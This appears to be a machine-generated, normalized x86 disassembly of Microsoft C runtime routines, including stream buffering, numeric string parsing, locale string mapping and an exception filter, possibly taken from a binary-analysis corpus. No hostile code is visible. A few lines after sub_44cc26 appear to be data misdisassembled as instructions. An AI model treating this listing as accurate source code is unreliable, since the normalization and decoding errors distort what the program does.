test [ esi + 0xc ] 0x40
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440791
add esp 0x14
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_444560
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
cmp [ ebp - 0x228 ] 0x0
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov al dl
sub al 0x20
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor esi esi
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
xor esi esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x26c ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x26c ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
sub_44cc26
loope r-xdata
mov esp 0xfffffd
je r-xdata
inc esp
add [ edi ] ah
retn
mov eax [ ebp - 0x228 ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
sub_44cc32
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_444560
push eax
call sub_451499
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_443d18
add eax 0x20
cmp esi eax
jne r-xdata
call sub_443d18
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_445f36
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_44ccce
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_444592
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_44cd02
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_44ce61
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_45321b
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_44cda9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_441455
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_452aee
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_44ce61
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_44d529 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov cl al
sub cl 0x31
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
mov cl al
sub cl 0x31
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
mov cl al
sub cl 0x31
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_453ca3
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp al 0x63
jle r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp al 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
add eax ecx
mov ebx eax
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
movzx ecx [ ebx + 0xa ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x32 ]
mov esi ecx
mov edx 0x7fff
xor esi eax
and eax edx
and ecx edx
and esi 0x8000
mov edi 0x7fff
lea edx [ ecx + eax ]
mov [ ebp - 0x70 ] esi
movzx edx dx
cmp ax di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp cx di
jae r-xdata
mov edi 0xbffd
cmp dx di
ja r-xdata
mov esi 0x3fbf
cmp dx si
ja r-xdata
xor esi esi
cmp ax si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp cx si
jne r-xdata
inc edx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc edx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
inc edi
inc edi
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov ecx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] ecx
test ecx ecx
jle r-xdata
add edx 0xc002
test dx dx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add edx 0xffff
test dx dx
jge r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x2c ] cx
ja r-xdata
mov eax edx
neg eax
movzx esi ax
add edx esi
test dx dx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov ecx esi
add esi esi
or esi eax
shr ecx 0x1f
lea eax [ edi + edi ]
or eax ecx
add edx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test dx dx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x5c ]
movzx ecx [ ecx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax ecx
mov ecx [ edi - 0x4 ]
lea esi [ ecx + eax ]
cmp esi ecx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x2c ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ecx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_44d559
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_453e71
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_453eba
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_44120e
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_44120e
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_413960
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_441c3d
pop ecx
cmp eax ebx
je r-xdata
call sub_443650
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_443360
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_453eba
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_441c3d
pop ecx
cmp eax ebx
je r-xdata
call sub_443650
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_413960
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_413960
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_441c3d
pop ecx
cmp eax ebx
je r-xdata
call sub_443650
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_44d8fe
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_44d559
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44d943
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_441455
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_44d98e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_44b0de
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_44d9de
mov eax [ rw-data ]
xor edx edx
test eax eax
jne r-xdata
movzx ecx [ eax ]
cmp cx 0x20
ja r-xdata
mov eax r--data
cmp cx 0x22
jne r-xdata
test cx cx
je r-xdata
inc eax
inc eax
jmp r-xdata
xor ecx ecx
test edx edx
sete cl
mov edx ecx
retn
test edx edx
je r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx 0x20
ja r-xdata
inc eax
inc eax
